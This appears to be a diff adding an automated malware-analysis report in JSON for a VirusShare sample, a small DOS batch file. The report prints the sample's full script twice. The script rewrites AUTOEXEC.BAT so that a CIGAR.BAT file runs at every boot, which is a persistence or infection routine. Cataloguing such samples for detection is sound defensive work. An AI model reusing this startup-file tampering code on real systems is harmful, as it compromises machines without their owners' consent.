@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\nif no exist c:\\cigar.bat goto cigar\nfor %%i in (*.bat) do set cigar=%%i\nfor %%o in (%bt%) do if \"%cigar%\"==\"AUTOEXEC.BAT\" goto mod\ngoto n\n:cigar\necho @echo off >> c:\\cigar.bat\n:mod\nrem ------ Modul 1 -------\nattrib autoexec.bat -r\ncopy autoexec.bat autoexec.olf\necho @if exist CIGAR.BAT call CIGAR.BAT > autoexec.bat\ntype autoexec.olf >> autoexec.bat\ndel autoexec.olf\n:n\n"
+    },
+    "filename": "VirusShare_4b322af650728d633b873a53512c0fba",
+    "filesize": 398,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4b322af650728d633b873a53512c0fba",
+        "sha1": "8c764413ec884f3edfea7270b7a2702229168ee9",
+        "sha256": "7a8d0c2986340ce5dbc0440d5a99c4450e8b818658dd7d589bb69af6e4674eea"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if no exist c:\\cigar.bat goto cigar",
+            "for %%i in (*.bat) do set cigar=%%i",
+            "for %%o in (%bt%) do if \"%cigar%\"==\"AUTOEXEC.BAT\" goto mod",
+            "goto n",
+            ":cigar",
+            "echo @echo off >> c:\\cigar.bat",
+            ":mod",
+            "rem ------ Modul 1 -------",
+            "attrib autoexec.bat -r",
+            "copy autoexec.bat autoexec.olf",
+            "echo @if exist CIGAR.BAT call CIGAR.BAT > autoexec.bat",
+            "type autoexec.olf >> autoexec.bat",
+            "del autoexec.olf"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.249549",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
